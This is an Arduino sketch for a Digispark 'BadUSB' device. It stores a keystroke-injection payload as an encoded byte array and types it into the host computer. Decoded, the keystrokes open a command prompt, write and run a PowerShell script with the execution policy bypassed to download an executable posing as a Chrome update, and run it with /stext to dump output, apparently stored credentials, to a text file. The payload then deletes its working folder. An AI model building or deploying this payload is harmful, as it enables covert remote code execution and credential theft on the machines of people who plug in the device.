/*
* Sketch generated by duck2spark
* by Quacked
*/
#include "DigiKeyboard.h"

#define DUCK_LEN 1582
const PROGMEM uint8_t duckraw [DUCK_LEN] = {
	0x15, 0x8, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x0, 0xff, 0x0, 0xf5, 0x6, 0x0, 0x10, 0x0, 0x7, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x28, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x0, 0xff, 0x0, 0xf5, 0x10, 0x0, 0xe, 0x0, 0x7, 0x0, 0xc, 0x0, 0x15, 0x0, 0x2c, 0x0, 0x6, 0x0, 0xb, 0x0, 0x15, 0x0, 0x12, 0x0, 0x10, 0x0, 0x8, 0x0, 0x2c, 0x0, 0x23, 0x2, 0x2c, 0x0, 0x6, 0x0, 0x7, 0x0, 0x2c, 0x0, 0x6, 0x0, 0xb, 0x0, 0x15, 0x0, 0x12, 0x0, 0x10, 0x0, 0x8, 0x0, 0x2c, 0x0, 0x23, 0x2, 0x2c, 0x0, 0x8, 0x0, 0x6, 0x0, 0xb, 0x0, 0x12, 0x0, 0x2c, 0x0, 0x25, 0x2, 0x1a, 0x0, 0xa, 0x0, 0x8, 0x0, 0x17, 0x0, 0x2c, 0x0, 0x2d, 0x0, 0xb, 0x0, 0x17, 0x0, 0x17, 0x0, 0x13, 0x0, 0x16, 0x0, 0x37, 0x2, 0x24, 0x2, 0x24, 0x2, 0x12, 0x0, 0x7, 0x0, 0x37, 0x0, 0xf, 0x0, 0xe, 0x0, 0x24, 0x2, 0x16, 0x0, 0x24, 0x2, 0x10, 0x2, 0x17, 0x2, 0x19, 0x2, 0x9, 0x0, 0x11, 0x2, 0x17, 0x2, 0xc, 0x2, 0x21, 0x0, 0x12, 0x2, 0x17, 0x2, 0xe, 0x0, 0x1c, 0x0, 0x11, 0x2, 0xf, 0x0, 0x25, 0x0, 0x24, 0x2, 0x6, 0x2, 0xb, 0x0, 0x15, 0x0, 0x12, 0x0, 0x10, 0x0, 0x8, 0x0, 0x18, 0x2, 0x13, 0x0, 0x7, 0x0, 0x4, 0x0, 0x17, 0x0, 0x8, 0x0, 0x7, 0x2, 0x12, 0x0, 0x1a, 0x0, 0x11, 0x0, 0xf, 0x0, 0x12, 0x0, 0x4, 0x0, 0x7, 0x0, 0x37, 0x0, 0x13, 0x0, 0x16, 0x0, 0x1e, 0x0, 0x2d, 0x0, 0x2c, 0x0, 0x38, 0x0, 0x12, 0x2, 0x18, 0x0, 0x17, 0x0, 0x9, 0x2, 0xc, 0x0, 0xf, 0x0, 0x8, 0x0, 0x2c, 0x0, 0x6, 0x2, 0xb, 0x0, 0x15, 0x0, 0x12, 0x0, 0x10, 0x0, 0x8, 0x0, 0x18, 0x2, 0x13, 0x0, 0x7, 0x0, 0x4, 0x0, 0x17, 0x0, 0x8, 0x0, 0x7, 0x2, 0x12, 0x0, 0x1a, 0x0, 0x11, 0x0, 0xf, 0x0, 0x12, 0x0, 0x4, 0x0, 0x7, 0x0, 0x37, 0x0, 0x13, 0x0, 0x16, 0x0, 0x1e, 0x0, 0x26, 0x2, 0x2c, 0x0, 0x64, 0x2, 0x2c, 0x0, 0x5, 0x0, 0x37, 0x0, 0x13, 0x0, 0x16, 0x0, 0x1e, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x0, 0xff, 0x0, 0xf5, 0x28, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x13, 0x0, 0x12, 0x0, 0x1a, 0x0, 0x8, 0x0, 0x15, 0x0, 0x16, 0x0, 0xb, 0x0, 0x8, 0x0, 0xf, 0x0, 0xf, 0x0, 0x2c, 0x0, 0x38, 0x0, 0x8, 0x2, 0x1b, 0x0, 0x8, 0x0, 0x6, 0x0, 0x18, 0x0, 0x17, 0x0, 0xc, 0x0, 0x12, 0x0, 0x11, 0x0, 0x13, 0x2, 0x12, 0x0, 0xf, 0x0, 0xc, 0x0, 0x6, 0x0, 0x1c, 0x0, 0x2c, 0x0, 0x5, 0x2, 0x1c, 0x0, 0x13, 0x2, 0x4, 0x0, 0x16, 0x0, 0x16, 0x0, 0x2c, 0x0, 0x38, 0x0, 0x9, 0x2, 0xc, 0x0, 0xf, 0x0, 0x8, 0x0, 0x2c, 0x0, 0x5, 0x0, 0x37, 0x0, 0x13, 0x0, 0x16, 0x0, 0x1e, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x28, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x0, 0xff, 0x0, 0xf5, 0x13, 0x0, 0x12, 0x0, 0x1a, 0x0, 0x8, 0x0, 0x15, 0x0, 0x16, 0x0, 0xb, 0x0, 0x8, 0x0, 0xf, 0x0, 0xf, 0x0, 0x2c, 0x0, 0x38, 0x0, 0x8, 0x2, 0x1b, 0x0, 0x8, 0x0, 0x6, 0x0, 0x18, 0x0, 0x17, 0x0, 0xc, 0x0, 0x12, 0x0, 0x11, 0x0, 0x13, 0x2, 0x12, 0x0, 0xf, 0x0, 0xc, 0x0, 0x6, 0x0, 0x1c, 0x0, 0x2c, 0x0, 0x5, 0x2, 0x1c, 0x0, 0x13, 0x2, 0x4, 0x0, 0x16, 0x0, 0x16, 0x0, 0x2c, 0x0, 0x38, 0x0, 0x9, 0x2, 0xc, 0x0, 0xf, 0x0, 0x8, 0x0, 0x2c, 0x0, 0x6, 0x2, 0xb, 0x0, 0x15, 0x0, 0x12, 0x0, 0x10, 0x0, 0x8, 0x0, 0x18, 0x2, 0x13, 0x0, 0x7, 0x0, 0x4, 0x0, 0x17, 0x0, 0x8, 0x0, 0x7, 0x2, 0x12, 0x0, 0x1a, 0x0, 0x11, 0x0, 0xf, 0x0, 0x12, 0x0, 0x4, 0x0, 0x7, 0x0, 0x37, 0x0, 0x13, 0x0, 0x16, 0x0, 0x1e, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x28, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0x5f, 0x18, 0x0, 0x13, 0x0, 0x7, 0x0, 0x4, 0x0, 0x17, 0x0, 0x8, 0x0, 0x37, 0x0, 0x8, 0x0, 0x1b, 0x0, 0x8, 0x0, 0x2c, 0x0, 0x24, 0x2, 0x16, 0x0, 0x17, 0x0, 0x8, 0x0, 0x1b, 0x0, 0x17, 0x0, 0x2c, 0x0, 0x10, 0x0, 0x4, 0x0, 0xc, 0x0, 0x11, 0x0, 0x17, 0x0, 0x8, 0x0, 0x11, 0x0, 0x4, 0x0, 0x11, 0x0, 0x6, 0x0, 0x8, 0x0, 0x37, 0x0, 0x17, 0x0, 0x1b, 0x0, 0x17, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x28, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x1d, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x2b, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x2b, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x28, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x0, 0xff, 0x0, 0xf5, 0x13, 0x0, 0x12, 0x0, 0x1a, 0x0, 0x8, 0x0, 0x15, 0x0, 0x16, 0x0, 0xb, 0x0, 0x8, 0x0, 0xf, 0x0, 0xf, 0x0, 0x2c, 0x0, 0x38, 0x0, 0x8, 0x2, 0x1b, 0x0, 0x8, 0x0, 0x6, 0x0, 0x18, 0x0, 0x17, 0x0, 0xc, 0x0, 0x12, 0x0, 0x11, 0x0, 0x13, 0x2, 0x12, 0x0, 0xf, 0x0, 0xc, 0x0, 0x6, 0x0, 0x1c, 0x0, 0x2c, 0x0, 0x5, 0x2, 0x1c, 0x0, 0x13, 0x2, 0x4, 0x0, 0x16, 0x0, 0x16, 0x0, 0x2c, 0x0, 0x37, 0x0, 0x24, 0x2, 0x10, 0x0, 0x4, 0x0, 0xc, 0x0, 0x11, 0x0, 0x17, 0x0, 0x8, 0x0, 0x11, 0x0, 0x4, 0x0, 0x11, 0x0, 0x6, 0x0, 0x8, 0x0, 0x37, 0x0, 0x13, 0x0, 0x16, 0x0, 0x1e, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x28, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x0, 0xff, 0x0, 0xf5, 0x6, 0x0, 0x7, 0x0, 0x2c, 0x0, 0x37, 0x0, 0x37, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x28, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x15, 0x0, 0x10, 0x0, 0x7, 0x0, 0xc, 0x0, 0x15, 0x0, 0x2c, 0x0, 0x24, 0x2, 0x16, 0x0, 0x2c, 0x0, 0x24, 0x2, 0x14, 0x0, 0x2c, 0x0, 0x6, 0x0, 0xb, 0x0, 0x15, 0x0, 0x12, 0x0, 0x10, 0x0, 0x8, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x28, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x8, 0x0, 0x1b, 0x0, 0xc, 0x0, 0x17, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf, 0x28, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xaf
};
int i = 4; //how many times the payload should run (-1 for endless loop)
bool blink=true;

void setup()
{
	DigiKeyboard.update();
	DigiKeyboard.delay(4000); //wait 4000 milliseconds before first run, to give target time to initialize
}

void loop()
{

	//parse raw duckencoder script
	for (int i=0; i<DUCK_LEN; i+=2)
	{
		uint8_t key = pgm_read_word_near(duckraw + i);
		uint8_t mod = pgm_read_word_near(duckraw + i+1);
		if (key == 0) //delay (a delay>255 is split into a sequence of delays)
		{
			DigiKeyboard.delay(mod);
		}
		else DigiKeyboard.sendKeyStroke(key,mod);
	}

	DigiKeyboard.delay(1000); //wait 1000 milliseconds before next loop iteration

	while(1)
	{
		  digitalWrite(1, HIGH);
		  delay(1000);
		  digitalWrite(1, LOW);
		  delay(1000);
	}
}
